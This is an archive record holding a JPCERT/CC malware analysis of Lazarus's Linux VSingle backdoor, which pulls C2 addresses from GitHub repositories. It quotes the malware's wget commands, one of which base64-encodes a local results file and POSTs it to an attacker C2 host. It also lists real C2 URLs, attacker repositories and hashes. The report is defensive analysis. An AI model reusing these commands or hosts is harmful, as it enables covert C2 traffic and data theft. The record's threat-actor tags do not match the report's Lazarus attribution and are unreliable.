{
    "id": "2eaf776b-f8ca-4aec-897c-5d24af1b7b02",
    "created_at": "2023-01-12T15:01:10.690323Z",
    "updated_at": "2025-03-27T02:17:02.242089Z",
    "deleted_at": null,
    "sha1_hash": "88aa63d70ccb70d5a25b7b304d0f2faeb096afac",
    "title": "2022-07-05 - VSingle malware that obtains C2 server information from GitHub",
    "authors": "",
    "file_creation_date": "2022-07-18T18:06:59Z",
    "file_modification_date": "2022-07-18T18:06:59Z",
    "file_size": 634202,
    "plain_text": "# VSingle malware that obtains C2 server information from GitHub\n\n**blogs.jpcert.or.jp/en/2022/07/vsingle.html**\n\n朝長 [秀誠 (Shusei Tomonaga)](https://blogs.jpcert.or.jp/en/shu_tom/)\n\nJuly 5, 2022\n\n[Lazarus](https://blogs.jpcert.or.jp/en/tags/lazarus/)\n\n[Email](http://10.10.0.46/mailto:?subject=VSingle%20malware%20that%20obtains%20C2%20server%20information%20from%20GitHub&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2022%2F07%2Fvsingle.html)\n\nSome types of malware use DGA, obfuscate destination information, or contain fake C2\nserver information in order to hide the original C2 server. Others obtain C2 server information\n[from legitimate servers. Recently, the malware used by Lazarus VSingle has been updated](https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html)\nto retrieve C2 servers information from GitHub. This article focuses on the updates of\nVSingle. VSingle has two versions, one targeting Windows OS and the other targeting Linux\nOS, and this article is based on the latter, which has more updates.\n\n### Overview of VSingle\n\nVSingle has threehard-coded C2 servers. However, when it can not obtain data from them,\nthe malware accesses GitHub to obtain new C2 servers. Figure 1 shows the operation flow\nof VSingle.\n\n\n-----\n\nFigure 1: Operation flow of VSingle\nThe first communication sends the following data. `uid contains a hashed value of the`\nhostname, kernel release number, and an octet of IP address combined. `upw contains a`\nBase64-encoded string of \"[IP address]|30.0|12b\".\n```\nhttps://mantis.westlinks.net/api/soap/mc_enum.php?uid=[ランダムな数字列]&upw=[Base64文字\n\n```\n列]\n\nThe data sent by the C2 server in response to the above request will be stored in the\nfollowing directory. The data after `<contents> in this data is the AES key, IV data and`\ncommand (with Base64+RC4).\n\n/tmp/.sess_%08x\n\n\n-----\n\nIn the following sections, I would like to expoain the access patterns to GitHub and\ncommunication method.\n\n### Access Patterns to GitHub\n\nThe GitHub repository from which the communication is obtained is not fixed but dynamically\ngenerated. The following is the pattern of URLs to be accessed.\n```\nhttps://raw.githubusercontent.com/%s/%s/master/README.de\n\n\n```\nThe user name and repository name are the string randomly selected from the following list +\na random string added.\n\nTable 1: String used for username and repository names\n\nUsername Repository name\n\ngar3ia Arcan3\n\nwo0d Wr0te\n\ntr3e after\n\nlucky luxuryboy\n\nl0ve pnpgather\n\nv0siej happyv1m\n\ne0vvsje laz3rpik\n\npolaris d0ta\n\ngrav1ty Dronek\n\nw1inter Panda3\n\nsummer cpsponso\n\nggo0dlluck\n\nThe GitHub repository used by the attacker includes a URL in the <videolink1> tag, as\nshown in Figure 2. The malware obtains this URL from the GitHub repository and connects\nto it. See Appendix A for the GitHub repositories that JPCERT/CC confirmed the attacker\nhad used.\n\n\n-----\n\nFigure 2: Example GitHub repository used by attackers\n\n### Communication Method\n\nThe current version of VSingle uses wget command to communicate with the C2 server while\nthe previous versions used system call. Figure 3 shows a part of the code that executes the\nwget command. (Vsingle on Windows OS does not include this update and uses Windows\nAPI, not wget command.)\n\nFigure 3: A part of the code to execute the wget command\nWhile most types of malware in general use system call and/or API to communicate with C2\nservers, VSingle dares to execute the wget command, which leaves traces easily. In addition,\nthe communication results are always saved in a file. During actual communication, the\nfollowing commands are executed.\n```\nsh -c \"wget -t 1 --server-response --no-check-certificate --user-agent=\\\"Mozilla/5.0\n(X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.24\nSafari/537.36\\\" \\\"https://mantis.westlinks.net/api/soap/mc_enum.php?\nuid=15022694&upw=MTkyLjE2OC4yLjI0fDMwLjB8MTJi\\\" -O /tmp/.sess_7b00cf8e 2>&1 | awk '/^\nHTTP/{print $2}'\"\n\n```\n\n-----\n\nAs for the command execution results, the contents of the file (/tmp/.sess_%04x) in which\nthe execution results are saved are Base64-encoded and sent via HTTP POST\ncommunication as shown below.\n```\nsh -c \"wget -t 1 --server-response --no-check-certificate --postdata=\\\"uid=15022694&fipng=`base64 /tmp/.sess_%04x`\\\" --user-agent=\\\"Mozilla/5.0 (X11;\nLinux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.24\nSafari/537.36\\\" \\\"https://mantis.westlinks.net/api/soap/mc_enum.php?\nuid=15022694&jsid=[AES Key, IV]\\\" -O /tmp/.sess_7b00cf8e 2>&1 | awk '/^ HTTP/{print\n$2}'\"\n\n\n### In closing\n\n```\nAttackers often tamper with legitimate web servers or use legitimate cloud services to\nconceal communication with C2 servers. Since it is difficult to detect such malware from logs,\nit is recommended to take countermeasures such as limiting accessible destinations for\nservers with limited purpose. See the Appendix for the destinations of the malware discussed\nin this article.\n\nShusei Tomonaga\n\n(Translated by Takumi Nakano)\n\n**Appendix A: GitHub repository used by the attacker**\n\nhttps://github.com/bgrav1ty13j/bPanda3\nhttps://github.com/fwo0d17n/fWr0te\nhttps://github.com/glucky18p/gluxuryboy\nhttps://github.com/gf00t18p/gpick/\nhttps://github.com/jv0siej21g/jlaz3rpik\n\n**Appendix B: C2 Server**\n\nhttps://mantis.westlinks.net/api/soap/mc_enum.php\nhttps://www.shipshorejob.com/ckeditor/samples/samples.php\nhttp://crm.vncgroup.com/cats/scripts/sphinxview.php\nhttps://ougreen.com/zone\nhttps://tecnojournals.com/general\nhttps://semiconductboard.com/xcror\nhttps://bluedragon.com/login\nhttps://tecnojournals.com/prest\n\n**Appendix C: Malware hash value**\n\n199ba618efc6af9280c5abd86c09cdf2d475c09c8c7ffc393a35c3d70277aed1\n2eb16dbc1097a590f07787ab285a013f5fe235287cb4fb948d4f9cce9efa5dbc\n414ed95d14964477bebf86dced0306714c497cde14dede67b0c1425ce451d3d7\n\n\n-----\n\n[Email](http://10.10.0.46/mailto:?subject=VSingle%20malware%20that%20obtains%20C2%20server%20information%20from%20GitHub&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2022%2F07%2Fvsingle.html)\n\nAuthor\n\n朝長 [秀誠 (Shusei Tomonaga)](https://blogs.jpcert.or.jp/en/shu_tom/)\n\nSince December 2012, he has been engaged in malware analysis and forensics\ninvestigation, and is especially involved in analyzing incidents of targeted attacks. Prior to\njoining JPCERT/CC, he was engaged in security monitoring and analysis operations at a\nforeign-affiliated IT vendor. He presented at CODE BLUE, BsidesLV, BlackHat USA Arsenal,\nBotconf, PacSec and FIRST Conference. JSAC organizer.\n\nWas this page helpful?\n\n0 people found this content helpful.\n\nIf you wish to make comments or ask questions, please use this form.\n\nThis form is for comments and inquiries. For any questions regarding specific commercial\nproducts, please contact the vendor.\n\nplease change the setting of your browser to set JavaScript valid.\nThank you!\n\n## Related articles\n\nYamaBot Malware Used by Lazarus\n\n\n-----\n\nAnalysis of HUI Loader\n\nAnti-UPX Unpacking Technique\n\nFAQ: Malware that Targets Mobile Devices and How to Protect Them\n\nMalware WinDealer used by LuoYu Attack Group\n\n\n[Back](https://blogs.jpcert.or.jp/en/2022/06/tsubame_overflow_2022-01-03.html)\n[Top](https://blogs.jpcert.or.jp/en/)\n[Next](https://blogs.jpcert.or.jp/en/2022/07/yamabot.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-07-05 - VSingle malware that obtains C2 server information from GitHub.pdf"
    ],
    "report_names": [
        "2022-07-05 - VSingle malware that obtains C2 server information from GitHub.pdf"
    ],
    "threat_actors": [
        {
            "id": "b69037ec-2605-4de4-bb32-a20d780a8406",
            "created_at": "2023-01-06T13:46:38.790766Z",
            "updated_at": "2025-03-27T02:00:02.919758Z",
            "deleted_at": null,
            "main_name": "MUSTANG PANDA",
            "aliases": [
                "TEMP.HEX",
                "TA416",
                "TANTALUM",
                "Twill Typhoon",
                "Earth Preta",
                "Stately Taurus",
                "LuminousMoth",
                "Polaris",
                "BRONZE PRESIDENT",
                "HoneyMyte",
                "Red Lich"
            ],
            "source_name": "MISPGALAXY:MUSTANG PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b72c2616-cc7c-4c47-a83d-6b7866b94746",
            "created_at": "2023-01-06T13:46:39.425297Z",
            "updated_at": "2025-03-27T02:00:03.08718Z",
            "deleted_at": null,
            "main_name": "Red Nue",
            "aliases": [
                "LuoYu"
            ],
            "source_name": "MISPGALAXY:Red Nue",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535670,
    "ts_updated_at": 1743041822,
    "ts_creation_date": 1658167619,
    "ts_modification_date": 1658167619,
    "files": {
        "pdf": "https://archive.orkl.eu/88aa63d70ccb70d5a25b7b304d0f2faeb096afac.pdf",
        "text": "https://archive.orkl.eu/88aa63d70ccb70d5a25b7b304d0f2faeb096afac.txt",
        "img": "https://archive.orkl.eu/88aa63d70ccb70d5a25b7b304d0f2faeb096afac.jpg"
    }
}